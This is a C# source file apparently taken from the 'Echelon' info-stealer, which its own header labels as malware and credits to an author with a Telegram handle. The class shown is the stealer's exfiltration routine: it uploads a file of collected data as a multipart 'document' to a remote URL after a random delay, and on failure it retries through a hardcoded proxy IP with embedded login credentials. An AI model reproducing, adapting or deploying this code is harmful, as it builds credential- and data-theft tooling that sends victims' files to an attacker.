///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Echelon
{
    public class SenderAPI
    {

        public static void POST(byte[] file, string filename, string contentType, string url)
        {

            Thread.Sleep(new Random(Environment.TickCount).Next(500, 2000));
            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                WebClient webClient = new WebClient
                {
                    Proxy = null //Не используем
                };

                string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                string @string = webClient.Encoding.GetString(file);
                string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                {

                    text,
                    filename,
                    contentType,
                    @string
                });
                byte[] bytes = webClient.Encoding.GetBytes(s);
                webClient.UploadData(url, "POST", bytes);
            }
            catch 
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
                using (var webClient = new WebClient())
                {
                    string text = "------------------------" + DateTime.Now.Ticks.ToString("x");
                    webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text);
                    string @string = webClient.Encoding.GetString(file);
                    string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", new object[]
                    {

                    text,
                    filename,
                    contentType,
                    @string
                    });
                    byte[] bytes = webClient.Encoding.GetBytes(s);
                    var proxy = new WebProxy("168.235.103.57", 3128) // IP Proxy
                    {
                        Credentials = new NetworkCredential("echelon", "002700z002700") // Логин и пароль Proxy
                    };
                    webClient.Proxy = proxy;
                    webClient.UploadData(url, "POST", bytes);
                }
            }
            return;

        }
    }
}
